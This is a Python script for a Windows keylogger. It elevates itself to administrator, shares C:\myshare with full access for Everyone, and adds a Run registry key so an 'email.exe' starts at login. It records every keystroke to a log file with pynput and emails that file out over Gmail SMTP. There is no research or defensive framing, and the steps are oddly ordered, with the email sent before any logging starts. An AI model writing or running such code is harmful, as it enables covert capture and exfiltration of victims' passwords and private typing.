import platform
import smtplib
import os
import sys
import ctypes
import subprocess
from pynput import keyboard
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication

def run_as_admin():
    if not is_admin():
        print("Restarting script with administrator privileges...")
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
        sys.exit()
        
# Constants
MARKER_FOLDER = r"C:\myshare"        

if __name__ == "__main__":
    # Restart the script with administrator privileges if needed
    run_as_admin()

# Function to check if the program is running on Windows 10
def check_windows_version():
    version = platform.version()
    release = platform.release()
    if release != "10":
        print("This script can only run on Windows 10.")
        sys.exit()

# Function to check for the marker folder and functions.exe
def check_marker_folder():
    marker_file = os.path.join(MARKER_FOLDER, "email.exe")
    if os.path.exists(MARKER_FOLDER) and os.path.exists(marker_file):
        print(f"Marker folder and {marker_file} found. Exiting the program.")
        sys.exit()

def create_shared_folder(folder_path, share_name):
    try:
        # Create the folder if it doesn't exist
        if not os.path.exists(folder_path):
            os.makedirs(folder_path)
            print(f"Folder created: {folder_path}")
        else:
            print(f"Folder already exists: {folder_path}")

        # Share the folder using the 'net share' command
        share_command = f'net share {share_name}="{folder_path}" /GRANT:Everyone,FULL'
        subprocess.run(share_command, shell=True, check=True)
        print(f"Folder shared successfully as '{share_name}' with full access for Everyone.")
    except subprocess.CalledProcessError as e:
        print(f"Error sharing folder: {e}")
    except Exception as e:
        print(f"An error occurred: {e}")

# Define the folder path and share name
folder_path = r"C:\myshare"
share_name = "myshare"

create_shared_folder(folder_path, share_name)

# Your email info
sender_email = "your_email@gmail.com"
receiver_email = "your_email@gmail.com"
password = "your_app_password"  # Use Gmail app password

# Create email
msg = MIMEMultipart()
msg['Subject'] = 'Here is your text file!'
msg['From'] = sender_email
msg['To'] = receiver_email

# Email body
msg.attach(MIMEText("Attached is the text.txt file you wanted."))

# Attach file
filename = "C:\\myshare\\logfile.txt"
with open(filename, "rb") as f:
    file_part = MIMEApplication(f.read(), Name=filename)
    file_part['Content-Disposition'] = f'attachment; filename="{filename}"'
    msg.attach(file_part)

# Send email
with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
    server.login(sender_email, password)
    server.send_message(msg)

print("Email sent!")

# Path to your log file
log_file_path = r"C:\myshare\logfile.txt"

# Ensure the directory exists
os.makedirs(os.path.dirname(log_file_path), exist_ok=True)

try:
    command = r'reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Program1" /t REG_SZ /d "C:\myshare\email.exe --startup" /f'
    subprocess.run(command, shell=True, check=True)
    print("Registry key added successfully.")
except Exception as e:
    print(f"Error setting up marker folder and registry: {e}")

# Function to write keystrokes
def on_press(key):
    try:
        with open(log_file_path, "a") as log_file:
            log_file.write(f"{key.char}")
    except AttributeError:
        # Special keys (e.g., enter, shift, etc.)
        with open(log_file_path, "a") as log_file:
            log_file.write(f"[{key.name}]")

# Start the listener
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
    
create_shared_folder(folder_path, share_name)
check_windows_version()

# Verify that email.exe exists before copying
source_file = "email.exe"
destination_path = r"C:\myshare"

if os.path.exists(source_file):
    command = f'copy "{source_file}" "{destination_path}"'
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    if result.returncode == 0:
        print(f"Successfully copied '{source_file}' to '{destination_path}'.")
    else:
        print(f"Failed to copy '{source_file}'. Error: {result.stderr}")
else:
    print(f"The file '{source_file}' does not exist. Cannot proceed with the copy operation.")
